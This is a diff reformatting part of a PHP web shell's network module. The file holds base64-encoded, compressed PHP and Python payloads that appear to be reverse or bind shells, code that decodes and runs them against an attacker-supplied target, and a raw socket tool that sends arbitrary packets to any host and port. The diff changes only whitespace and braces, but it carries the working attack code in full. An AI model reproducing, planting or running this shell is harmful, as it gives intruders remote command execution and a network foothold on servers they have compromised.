@@ -2,7 +2,7 @@
 $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:"";
 $remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:"";
 $default_port = 13123;
-$winbinary = (strtolower(substr(php_uname(),0,3))=="win")? "<option>executable</option>":"";
+$winbinary = (strtolower(substr(php_uname(), 0, 3))=="win")? "<option>executable</option>":"";
 
 $GLOBALS['resources']['rs_php'] = "7VRNj9s2ED3bv0JRBSyFKrZlFwiwLjeX9lggaAv0kN0KMkWtCEsiy6FqB9397x1+yB8bZzdIg15aGJbIGc6b4czT+/6tatT0m6gxRsH1fH4vTDNsZkx2883qzXdb/5xyraUuNFdSG9Hfk0W6ngI3hREdL1rRCeNMclOITrWCCVPU7QANQeM0MaW+5wYo36tWVpzEUZwFI/oTBjRfrd7galfSfmhbXPHDChoaYyAmjn798eef6N5w3a3f/ZLTq9vk3W8/3Fytgxtt6/lG9HNootcixtiOxq7+CBrettF1xGTfc2Z4ddujfypqwuTQGzKWmFKap39NJ4miwbTGDVYQ27dBONFXuH6c8hb4pfDleTi8X9x5iIMhvxuxSrZ1WLaOeuiZEbIv+F6AAXKlWG/aopZ6e5V6TFHRo9F2doJxzkxf5ynGGZKfWL1lESxKgtgXODMQFUnPI3wFWFK4n0sHFIzmZVeAZFscNXD9J9ckNkwhTxYz97uOZ4nKEqRHL90LY2zCMTRQRA7YI8hWrpiEPUEuGePKHgilotfIVu4wGwwb3BHkaDH0ZcdJmi2yVYr1xzvRu0In9U4Lw0nCsqSbYYfZDi84i29iCzfZNaJFp3pFaV3izFyIHVBth4FR7pTrkOb3RVca1pB4zqrbiLz//Rbuvk3nAumKt9Q69dGTpKoobv0ofbSAohKaoCdNWTMuvTuR9LQuZ3y0j0Aio0V3eutEuRva+cTRw0P0Cf8fA/rTaIO93K5HuAiT8b29MeZCls8+ynzSL+kKtKXUrJXAx3aMOzcRdFvgp612B5MKaKl1+YEs6I1fxEooHmexjtMsf2rcoXF5wejBlKZKS1ZIxXtM3mQIj50XyrmxUa+wy5qDHDSzN8R5HFl/yrlNi8yyOmWD8QvMFs+fyF88sXz2BAtOTzajh0Az+11zWdu2Pjz4lU+XpsepJboMPbR9DeWEpJ5Ah5wtahfB8xkqJX5uZWY18kBg0RdHHF0eyCpojfGVMzMInBxHGRqUiPRIyzOssaBLgKPvI1T2AuDyGcDly4CP5xw9Ie+49Nc63+dP9qG9jnKjWXvGH/Tdi6IV6iCKtRUtT9DGqQLv8T9q25erF3yResF/Vr3gknp9Sq/gf706OwEv6RV8nl7BV9IruKwG8K/pFXxtvYLP0at/LFJvb/4G";
 $GLOBALS['resources']['rs_python'] = "rVRtb9owEP6c/IrUnYYtUlNoq010QUJtOlVbWwRM+9B2KDgHiQpOZDst/fc7JykwxNQPmxBJ7sV399w958ODVqFVa5rKFshnL381SSbdQy8xJtfdVmuemqSYcpEtW9OTT6dP1dNNl3mmjKfA18U0V5kArf1M+/oV/5l4AuObdAluHhDiJvYRw8zTCSwWVLCu69gzweYsH2Q5SCr80iUYqwIjmzgrzB9O14PQqkGpfepU7mqZ6ygwhZKe1fIqIlcQxZQ131QYbUu1zA1lHKTIYqCNwsyOPjeYW5YfCZNmsqo/nXmZ5jJawkFApCGocmaB4LN0ATKjmNhBO7bDwJISWJXtGofDm2BlQC3PB6N20Pgw+HnZa5zXVlSdl4PQiXeUel8+kqY2is5Yk3i9baGzkTAPLDTY7C8JpvZs56zkGPVavh2FVSkQz7R93DllPIYSGSmREVunAysBuam880jrUldHdSxShEQV6x1XCmcaKOAaIiUSSkT84NH7Xw/6scmIr/zZIppr63D99fZuGF70RyGrjmGgaR2hbl8emYSnOk4VnfK5yoqcthl787ENFMmOsbbh4EDG9G/zqt02IDCYpVLJP8W2iiiMF8m4RIjfFmMd2kruOohX0+gqQqliw1vu7ppj5EGSJhY9ByNeLJ1Ij7jzAEnAIzV/dutOzlkQdOwKBPP79qMLiy39yUbvJPjuWDvmh1VqED7uUyoNzZmrg2rNePWitdS/mlzfhuN6B/no7uLbZDQehv0bPILAjDVk+dp/dPd9Yp22j0yG4Y9R2L+8HPqYcadozZGhMaXkmJc/4ue225ovUqS6pGcoWOrhKkcsQODCcsvuw4Zl9mbgegFgJ7oh8L6Vehs0JeW9U90gXtcTmZQgDMTY8r3TX4/+vQBkvfR746x33t2ZkgXpIUGrOJQmVSP2ojx7D6X+V5T6v6DU7Dc=";
@@ -84,69 +84,72 @@ $GLOBALS['module']['network']['content'] = "
 ";
 
 
-if(isset($p['rsLang']) && isset($p['rsArgs'])){
-	$rsLang = $p['rsLang'];
-	$rsArgs = $p['rsArgs'];
-	$res = "";
+if (isset($p['rsLang']) && isset($p['rsArgs'])) {
+    $rsLang = $p['rsLang'];
+    $rsArgs = $p['rsArgs'];
+    $res = "";
 
-	if($rsLang=="php"){
-		$code = get_resource("rs_".$rsLang);
-		if($code!==false){
-			$code = "?><?php \$target = \"".$rsArgs."\"; ?>".$code;
-			$res = eval_go($rsLang, $code, "", "");
-		}
-	}
-	else{
-		$code = get_resource("rs_".$rsLang);
-		if($code!==false){
-			$res = eval_go($rsLang, $code, "", $rsArgs);
-		}
-	}
+    if ($rsLang=="php") {
+        $code = get_resource("rs_".$rsLang);
+        if ($code!==false) {
+            $code = "?><?php \$target = \"".$rsArgs."\"; ?>".$code;
+            $res = eval_go($rsLang, $code, "", "");
+        }
+    } else {
+        $code = get_resource("rs_".$rsLang);
+        if ($code!==false) {
+            $res = eval_go($rsLang, $code, "", $rsArgs);
+        }
+    }
 
-	if($res===false) $res == "error";
-	output(html_safe($res));
+    if ($res===false) {
+        $res == "error";
+    }
+    output(html_safe($res));
+} elseif (isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])) {
+    $packetHost = trim($p['packetHost']);
+    if (!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) {
+        $packetHost = "tcp://".$packetHost;
+    }
+
+    $packetPort = (int) $p['packetPort'];
+
+    $packetTimeout = (int) $p['packetTimeout'];
+    $packetSTimeout = (int) $p['packetSTimeout'];
+
+    $packetContent = $p['packetContent'];
+    if (ctype_xdigit($packetContent)) {
+        $packetContent = @pack("H*", $packetContent);
+    } else {
+        $packetContent = str_replace(array("\r","\n"), "", $packetContent);
+        $packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
+    }
+
+    $res = "";
+
+
+    $sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);
+    if (!$sock) {
+        $res .= "<div class='weak'>";
+        $res .= html_safe(trim($errStr))." (error ".html_safe(trim($errNo)).")</div>";
+    } else {
+        stream_set_timeout($sock, $packetSTimeout);
+        fwrite($sock, $packetContent."\r\n\r\n\x00");
+        $counter = 0;
+        $maxtry = 1;
+        $bin = "";
+        do {
+            $line = fgets($sock, 1024);
+            if (trim($line)=="") {
+                $counter++;
+            }
+            $bin .= $line;
+        } while ($counter<$maxtry);
+        fclose($sock);
+        $res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>";
+        $res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>";
+    }
+
+    output($res);
 }
-elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){
-	$packetHost = trim($p['packetHost']);
-	if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost;
-
-	$packetPort = (int) $p['packetPort'];
-
-	$packetTimeout = (int) $p['packetTimeout'];
-	$packetSTimeout = (int) $p['packetSTimeout'];
-
-	$packetContent = $p['packetContent'];
-	if(ctype_xdigit($packetContent)) $packetContent = @pack("H*" , $packetContent);
-	else{
-		$packetContent = str_replace(array("\r","\n"), "", $packetContent);
-		$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
-	}
-
-	$res = "";
-
-
-	$sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);
-	if(!$sock){
-		$res .= "<div class='weak'>";
-		$res .= html_safe(trim($errStr))." (error ".html_safe(trim($errNo)).")</div>";
-	}
-	else{
-		stream_set_timeout($sock, $packetSTimeout);
-		fwrite($sock, $packetContent."\r\n\r\n\x00");
-		$counter = 0;
-		$maxtry = 1;
-		$bin = "";
-		do{
-			$line = fgets($sock, 1024);
-			if(trim($line)=="") $counter++;
-			$bin .= $line;
-		}while($counter<$maxtry);
-		fclose($sock);
-		$res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>";
-		$res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>";
-	}
-
-	output($res);
-}
-
 ?>
